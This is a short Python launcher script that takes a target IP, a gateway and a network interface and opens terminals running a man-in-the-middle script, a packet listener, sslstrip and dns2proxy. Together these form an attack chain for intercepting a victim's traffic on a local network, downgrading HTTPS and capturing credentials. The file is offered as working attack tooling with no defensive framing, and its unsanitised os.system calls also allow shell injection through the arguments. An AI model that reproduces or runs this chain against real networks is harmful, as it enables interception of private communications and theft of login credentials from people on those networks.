import os
import optparse

#if you use the code you change the ip adress in code

def get_user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-i","--ipAdress",dest="ipAdress",help="Enter the ip adress!")
    parse_object.add_option("-g", "--gateway", dest="gateway", help="Enter the gateway!")
    parse_object.add_option("-n","--interface",dest="interface",help="Enter the interface!")
    parse_object.add_option("-f", "--whereFolder",dest= "whereFolder",help="Enter your dns2proxy folder")
    return parse_object.parse_args()

(userInput,arguments) = get_user_input()

os.system("gnome-terminal -e 'python mitm.py -i {} -p {}'".format(userInput.ipAdress,userInput.gateway))
os.system("gnome-terminal -e 'python PacketListener.py -i {}'".format(userInput.interface))
os.system("gnome-terminal -e 'sslstrip'")
os.system("gnome-terminal --working-directory={} -e 'python dns2proxy.py'".format(userInput.whereFolder))
